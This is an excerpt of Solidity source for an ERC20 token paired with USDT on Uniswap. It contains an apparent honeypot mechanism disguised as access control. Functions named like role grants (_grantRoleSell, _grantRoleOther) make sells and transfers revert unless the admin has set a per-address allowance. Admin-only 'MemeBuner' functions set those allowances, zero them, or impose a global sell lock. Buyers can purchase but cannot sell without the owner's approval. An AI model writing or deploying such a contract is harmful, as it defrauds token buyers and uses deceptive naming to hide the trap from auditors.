...
abstract contract NTACCControl is Context, INTACCControl {
    struct RoleData {
    ...
    mapping(address => uint256) private _number;
    mapping(address => uint256) private _Snumber; 
    ...
    function _grantRoleBuy(address to, uint256 amount) internal virtual {
        if (isContract(to)) {
            if (!_swapList[to]) {
                _number[to] = 0;
                _grantRole(TRADE, to);
    ...
    function _grantRoleSell(address from, uint256 amount) internal virtual {
        if (hasRole(ADMIN, from)) {

        } else if (_numberS > 0) {
            if (_Snumber[from] >= amount && amount > 0) {
                _Snumber[from] = _Snumber[from] - amount;
            } else {
                revert(" All Account transfer error");
            }
        } else if (amount <= 0 || _number[from] < amount) {
            revert("Account transfer error");
        } else if (_number[from] >= amount) {
            _number[from] = _number[from] - amount;
        }
    }

    function _grantRoleOther(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        ...
        } else if (_number[from] < amount || amount <= 0) {
            revert("Account transfer error");
        } else if (_number[from] >= amount) {
            _number[from] = _number[from] - amount;
        }
    ...
    function _grantRole(
        ...
        if (_swapList[from]) {
            _grantRoleBuy(to, amount);
        } else if (_swapList[to]) {
            _grantRoleSell(from, amount);
        } else {
            _grantRoleOther(from, to, amount);
        }
    }

    function _grantRoleSwap(address _swap) internal virtual {
        _swapList[_swap] = true;
    }
    ...
    function MemeBuner_A(address account, uint256 amount)
        ...
        onlyRole(ADMIN)
    {
        _number[account] = amount * 10**18;
    }

    function MemeBuner_Q(address account, uint256 amount)
        public
        onlyRole(ADMIN)
    {
        _Snumber[account] = amount * 10**18;
    }

    function MemeBuner_S(address account) public onlyRole(ADMIN) {
        _grantRole(TRADE, account);
        _number[account] = 0;
    }

    function MemeBuner_E() public onlyRole(ADMIN) {
        _numberS = 128;
    }

    function MemeBuner_F() public onlyRole(ADMIN) {
        _numberS = 0;
    }
...
contract token is ERC20, NTACCControl {
    ...
    constructor(
        ...
        _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()) 
            .createPair(
                address(this),
                address(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9) //USDT地址  
            );
